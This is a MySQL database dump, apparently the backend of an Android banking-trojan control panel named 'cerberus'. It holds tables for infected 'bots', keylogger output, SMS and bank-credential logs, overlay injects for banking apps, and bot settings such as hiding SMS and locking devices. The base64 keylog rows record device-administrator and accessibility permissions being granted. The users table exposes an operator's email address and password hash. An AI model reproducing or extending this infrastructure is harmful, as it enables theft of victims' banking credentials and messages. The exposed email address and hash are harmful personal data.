/*
 Navicat Premium Data Transfer

 Source Server         : 127.0.0.13_3306
 Source Server Type    : MySQL
 Source Server Version : 100422
 Source Host           : 127.0.0.13:3306
 Source Schema         : cerberus

 Target Server Type    : MySQL
 Target Server Version : 100422
 File Encoding         : 65001

 Date: 28/06/2022 16:28:51
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for application_list_logs
-- ----------------------------
DROP TABLE IF EXISTS `application_list_logs`;
CREATE TABLE `application_list_logs`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `logs` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for bank_logs
-- ----------------------------
DROP TABLE IF EXISTS `bank_logs`;
CREATE TABLE `bank_logs`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `inject_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `application` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `logs` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bank_logs
-- ----------------------------
INSERT INTO `bank_logs` VALUES (1, '1', 'app.com', '', 'world', NULL, NULL, '12345678');

-- ----------------------------
-- Table structure for bot_settings
-- ----------------------------
DROP TABLE IF EXISTS `bot_settings`;
CREATE TABLE `bot_settings`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `hide_sms` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `lock_device` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `off_sound` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `key_logger` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `active_injection` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bot_settings
-- ----------------------------
INSERT INTO `bot_settings` VALUES (1, '', '0', '0', '0', '0', '', '2022-06-22 08:54:36', '2022-06-28 16:20:37');
INSERT INTO `bot_settings` VALUES (2, '12345678', '0', '0', '0', '0', '', '2022-06-22 09:17:53', '2022-06-22 09:17:53');
INSERT INTO `bot_settings` VALUES (3, '4w0qylexv55ujf0o5', '0', '0', '0', '0', '', '2022-06-22 10:01:17', '2022-06-22 10:01:17');

-- ----------------------------
-- Table structure for bots
-- ----------------------------
DROP TABLE IF EXISTS `bots`;
CREATE TABLE `bots`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `operator` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `phone_number` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `model` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `country` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `last_connect` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `date_infection` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `commands` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `banks` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_protect` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_screen` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_accessibility` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_sms` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_cards` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_banks` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_mails` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `active_device` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `time_working` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_download_module` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stat_admin` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `update_settings` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `locale` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `battery_level` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bots
-- ----------------------------
INSERT INTO `bots` VALUES (1, '4w0qylexv55ujf0o5', '192.168.10.9', 'sime', '', '', '', 'tr', '', '2022-06-22 10:44:01', 'eyJuYW1lIjoic3RhcnRBdXRoZW50aWNhdG9yMiJ9', 'app.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', NULL, '2022-06-22 10:44:01', '5.2');

-- ----------------------------
-- Table structure for failed_jobs
-- ----------------------------
DROP TABLE IF EXISTS `failed_jobs`;
CREATE TABLE `failed_jobs`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp(0) NOT NULL DEFAULT current_timestamp(0),
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `failed_jobs_uuid_unique`(`uuid`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for global_settings
-- ----------------------------
DROP TABLE IF EXISTS `global_settings`;
CREATE TABLE `global_settings`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `urls` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `save_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `inject_time` int(11) NOT NULL DEFAULT 0,
  `protect_time` int(11) NOT NULL DEFAULT 0,
  `bot_table_time` int(11) NOT NULL DEFAULT 0,
  `push_title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `push_text` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `cc_time` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `mail_time` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of global_settings
-- ----------------------------
INSERT INTO `global_settings` VALUES (1, '[]', '', 30, 20, 26, '', '', '', '', '2022-06-22 09:00:11', '2022-06-28 16:20:35');

-- ----------------------------
-- Table structure for injects
-- ----------------------------
DROP TABLE IF EXISTS `injects`;
CREATE TABLE `injects`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `app` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `html` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `png` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `injects_app_unique`(`app`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of injects
-- ----------------------------
INSERT INTO `injects` VALUES (1, 'app.com', '', 'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA7UlEQVQ4je2SMUpDQRRFz5ufP/PTCMmITUiVVYg7EATBXQiuQFyA2ARNHbIVESRW6QKapNAETRMUBE3+THwWn+8CUlnkVpfHuZdXXBmTKhtKIJpNw6W2BWAkc4WzFowg1iLVDKlmYAyIIM4CFLeSLfnVcKjz4xP8dZs4nfLZ7bHX6xLfXlne3hGfX9g5O2V+eETj4Z6PyyvcwT5J3bOezX7k/aajSa2G2fWExxHLfp/6xTn5ZIJ+fVNpNlkNBqBK4j3rxYK01QKB8DRCxqQqzqIKhBxxDkQA0BiLl0Pkj4kRSSuogoQ8ynaJ/6DgFxHQU3/NQOnTAAAAAElFTkSuQmCC', 1, '2022-06-22 09:06:31', '2022-06-22 09:06:31');

-- ----------------------------
-- Table structure for key_logs_4w0qylexv55ujf0o5
-- ----------------------------
DROP TABLE IF EXISTS `key_logs_4w0qylexv55ujf0o5`;
CREATE TABLE `key_logs_4w0qylexv55ujf0o5`  (
  `ID` int(254) NOT NULL AUTO_INCREMENT,
  `logs` varchar(12000) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 24 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of key_logs_4w0qylexv55ujf0o5
-- ----------------------------
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (1, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdMTUgIyBbQWNjZXNzaWJpbGl0eV0=');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (2, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdMTUgIyBbQWNjZXNzaWJpbGl0eV0=');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (3, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdNiAjIFtBcHBzXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (4, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (5, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (6, 'MDYvMTgvMjAyMiwgMDQ6NTg6NTUgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (7, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDIgUERUW0ZvY3VzZWRdMTUgIyBbQWNjZXNzaWJpbGl0eV0=');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (8, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDIgUERUW0ZvY3VzZWRdMTE0ICMgW0lnbm9yZSBiYXR0ZXJ5IG9wdGltaXphdGlvbnM/LCBMZXQgYXBwIE1NTSBzdGF5IGNvbm5lY3RlZCBpbiB0aGUgYmFja2dyb3VuZD8gVGhpcyBtYXkgdXNlIG1vcmUgYmF0dGVyeS4sIE5PLCBZRVNd');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (9, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDIgUERUW0ZvY3VzZWRdMzIgIyBbQWN0aXZhdGUgZGV2aWNlIGFkbWluaXN0cmF0b3I/XQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (10, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDIgUERUW0NsaWNrXVtBY3RpdmF0ZSB0aGlzIGRldmljZSBhZG1pbmlzdHJhdG9yXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (11, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMTUgIyBbQWNjZXNzaWJpbGl0eV0=');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (12, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMTUgIyBbQWNjZXNzaWJpbGl0eV0=');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (13, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (14, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMTE0ICMgW0lnbm9yZSBiYXR0ZXJ5IG9wdGltaXphdGlvbnM/LCBMZXQgYXBwIE1NTSBzdGF5IGNvbm5lY3RlZCBpbiB0aGUgYmFja2dyb3VuZD8gVGhpcyBtYXkgdXNlIG1vcmUgYmF0dGVyeS4sIE5PLCBZRVNd');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (15, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMzUgIyBbTU1NJ3MgRGV2aWNlIEFkbWluIGlzIG5vdyBlbmFibGVkXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (16, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMzUgIyBbTU1NJ3MgRGV2aWNlIEFkbWluIGlzIG5vdyBlbmFibGVkXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (17, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (18, 'MDYvMTgvMjAyMiwgMDQ6NTk6MDMgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (19, 'MDYvMTgvMjAyMiwgMDQ6NTk6MjIgUERUW0ZvY3VzZWRdMTE0ICMgW0lnbm9yZSBiYXR0ZXJ5IG9wdGltaXphdGlvbnM/LCBMZXQgYXBwIE1NTSBzdGF5IGNvbm5lY3RlZCBpbiB0aGUgYmFja2dyb3VuZD8gVGhpcyBtYXkgdXNlIG1vcmUgYmF0dGVyeS4sIE5PLCBZRVNd');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (20, 'MDYvMTgvMjAyMiwgMDQ6NTk6MjIgUERUW0NsaWNrXVtZRVNd');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (21, 'MDYvMTgvMjAyMiwgMDU6MDM6MjMgUERUW0ZvY3VzZWRdMTEgIyBbT3ZlcnZpZXcuXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (22, 'MDYvMTgvMjAyMiwgMDU6MDM6MjMgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');
INSERT INTO `key_logs_4w0qylexv55ujf0o5` VALUES (23, 'MDYvMTgvMjAyMiwgMDU6MDM6MjMgUERUW0ZvY3VzZWRdMjAgIyBbSG9tZSBzY3JlZW4gMSBvZiAyXQ==');

-- ----------------------------
-- Table structure for migrations
-- ----------------------------
DROP TABLE IF EXISTS `migrations`;
CREATE TABLE `migrations`  (
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of migrations
-- ----------------------------
INSERT INTO `migrations` VALUES (1, '2014_10_12_000000_create_users_table', 1);
INSERT INTO `migrations` VALUES (2, '2014_10_12_100000_create_password_resets_table', 1);
INSERT INTO `migrations` VALUES (3, '2019_08_19_000000_create_failed_jobs_table', 1);
INSERT INTO `migrations` VALUES (4, '2019_12_14_000001_create_personal_access_tokens_table', 1);
INSERT INTO `migrations` VALUES (5, '2022_06_06_155834_create_injects_table', 1);
INSERT INTO `migrations` VALUES (6, '2022_06_07_013240_create_settings_table', 1);
INSERT INTO `migrations` VALUES (7, '2022_06_08_064112_create_phone_number_logs_table', 1);
INSERT INTO `migrations` VALUES (8, '2022_06_08_064352_create_application_list_logs_table', 1);
INSERT INTO `migrations` VALUES (9, '2022_06_08_064805_create_sms_logs_table', 1);
INSERT INTO `migrations` VALUES (10, '2022_06_09_112401_create_bots_table', 1);
INSERT INTO `migrations` VALUES (11, '2022_06_09_123429_create_bank_logs_table', 1);
INSERT INTO `migrations` VALUES (12, '2022_06_10_160919_create_bot_settings_table', 1);
INSERT INTO `migrations` VALUES (13, '2022_06_11_050705_add_bot_id_column_bot_logs', 1);
INSERT INTO `migrations` VALUES (14, '2022_06_11_053103_add_version_column_bots', 1);

-- ----------------------------
-- Table structure for password_resets
-- ----------------------------
DROP TABLE IF EXISTS `password_resets`;
CREATE TABLE `password_resets`  (
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  INDEX `password_resets_email_index`(`email`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for personal_access_tokens
-- ----------------------------
DROP TABLE IF EXISTS `personal_access_tokens`;
CREATE TABLE `personal_access_tokens`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `last_used_at` timestamp(0) NULL DEFAULT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `personal_access_tokens_token_unique`(`token`) USING BTREE,
  INDEX `personal_access_tokens_tokenable_type_tokenable_id_index`(`tokenable_type`, `tokenable_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for phone_number_logs
-- ----------------------------
DROP TABLE IF EXISTS `phone_number_logs`;
CREATE TABLE `phone_number_logs`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `logs` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for sms_logs
-- ----------------------------
DROP TABLE IF EXISTS `sms_logs`;
CREATE TABLE `sms_logs`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `logs` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp(0) NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `private_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `role` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `active` int(11) NOT NULL DEFAULT 1,
  `remember_token` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp(0) NULL DEFAULT NULL,
  `updated_at` timestamp(0) NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `users_email_unique`(`email`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES (1, 'Thomas Yamamoto', 'nightfurry0308@gmail.com', NULL, '$2y$10$gK7/2A73yi7AEOJpuq4br.NMXEfnzm2U9JcI1.9jsDQkrY3nWqh5W', '', '', '', 1, NULL, '2022-06-22 01:28:19', '2022-06-22 01:28:19');

SET FOREIGN_KEY_CHECKS = 1;
